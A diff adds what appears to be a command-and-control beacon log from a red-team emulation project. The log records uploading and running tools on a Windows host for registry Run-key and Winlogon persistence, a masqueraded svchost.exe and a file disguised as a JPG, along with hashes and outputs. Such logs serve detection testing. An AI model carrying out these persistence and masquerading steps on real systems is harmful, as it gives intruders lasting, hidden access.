@@ -1,0 +1,79 @@
+03/01 09:58:40 [task] 通过reg命令设置注册表项
+03/01 09:58:40 [task] Tasked beacon to make directory c:\RedTeam\
+03/01 09:58:40 [task] cd c:\RedTeam\
+03/01 09:58:43 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\calc.exe as calc.exe
+03/01 09:58:43 [indicator] file: 10e4a1d2132ccb5c6759f038cdb6f3c9 918528 bytes calc.exe
+03/01 09:58:43 [task] Tasked beacon to make directory c:\RedTeam\
+03/01 09:58:43 [task] cd c:\RedTeam\
+03/01 09:58:43 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\t1060_001.exe as t1060_001.exe
+03/01 09:58:43 [indicator] file: df26ad105c44f314001d2c3d02b728cf 7680 bytes t1060_001.exe
+03/01 09:58:43 [task] Tasked beacon to run: C:\RedTeam\t1060_001.exe
+03/01 09:59:39 [checkin] host called home, sent: 926404 bytes
+03/01 09:59:39 [output]
+received output:
+错误: 拒绝访问。
+
+
+03/01 16:54:26 [task] 设置Winlogon 加载项
+03/01 16:54:26 [task] Tasked beacon to make directory c:\RedTeam\
+03/01 16:54:26 [task] cd c:\RedTeam\
+03/01 16:54:26 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1004.exe as T1004.exe
+03/01 16:54:26 [indicator] file: c4582cf7726af0caa25f36895a8ea7ec 7680 bytes T1004.exe
+03/01 16:54:26 [task] Tasked beacon to run: C:\RedTeam\T1004.exe
+03/01 16:54:44 [checkin] host called home, sent: 7790 bytes
+03/01 16:54:44 [output]
+received output:
+操作成功完成。
+
+c:\RedTeam>
+
+03/01 16:56:04 [task] Tasked beacon to make directory c:\RedTeam\
+03/01 16:56:04 [task] cd c:\RedTeam\
+03/01 16:56:04 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1004_recover.exe as T1004_recover.exe
+03/01 16:56:04 [indicator] file: 044e18af79c0cf8fed4a806492a16d32 7680 bytes T1004_recover.exe
+03/01 16:56:04 [task] Tasked beacon to run: C:\RedTeam\T1004_recover.exe
+03/01 16:56:45 [checkin] host called home, sent: 7806 bytes
+03/01 16:56:45 [output]
+received output:
+操作成功完成。
+
+c:\RedTeam>
+
+03/01 17:00:44 [task] 设置Winlogon 加载项
+03/01 17:00:44 [task] Tasked beacon to make directory c:\RedTeam\
+03/01 17:00:44 [task] cd c:\RedTeam\
+03/01 17:00:44 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1004.exe as T1004.exe
+03/01 17:00:44 [indicator] file: c4582cf7726af0caa25f36895a8ea7ec 7680 bytes T1004.exe
+03/01 17:00:44 [task] Tasked beacon to run: C:\RedTeam\T1004.exe
+03/01 17:00:45 [checkin] host called home, sent: 7790 bytes
+03/01 17:00:45 [output]
+received output:
+操作成功完成。
+
+c:\RedTeam>
+
+03/01 17:01:03 [task] Tasked beacon to make directory c:\RedTeam\
+03/01 17:01:03 [task] cd c:\RedTeam\
+03/01 17:01:03 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1004_recover.exe as T1004_recover.exe
+03/01 17:01:03 [indicator] file: 044e18af79c0cf8fed4a806492a16d32 7680 bytes T1004_recover.exe
+03/01 17:01:03 [task] Tasked beacon to run: C:\RedTeam\T1004_recover.exe
+03/01 17:01:45 [checkin] host called home, sent: 7806 bytes
+03/01 17:01:45 [output]
+received output:
+操作成功完成。
+
+c:\RedTeam>
+
+03/01 17:28:30 [task] 非系统目录运行svchost
+03/01 17:28:30 [task] Tasked beacon to make directory c:\RedTeam\
+03/01 17:28:30 [task] cd c:\RedTeam\
+03/01 17:28:30 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\svchost.exe as svchost.exe
+03/01 17:28:30 [indicator] file: a5381751f68c2a8419151e1c82773502 169472 bytes svchost.exe
+03/01 17:28:30 [task] Tasked beacon to execute: c:\RedTeam\svchost.exe
+03/01 17:28:45 [checkin] host called home, sent: 169563 bytes
+03/01 17:51:22 [task] Tasked beacon to make directory c:\RedTeam\
+03/01 17:51:22 [task] cd c:\RedTeam\
+03/01 17:51:22 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\win32UIDEMO.JPG as win32UIDEMO.JPG
+03/01 17:51:22 [indicator] file: 5914071808bd3fc70ae84b5648783362 7168 bytes win32UIDEMO.JPG
+03/01 17:51:22 [task] Tasked beacon to run: C:\RedTeam\win32UIDEMO.JPG
+03/01 17:51:45 [checkin] host called home, sent: 7290 bytes
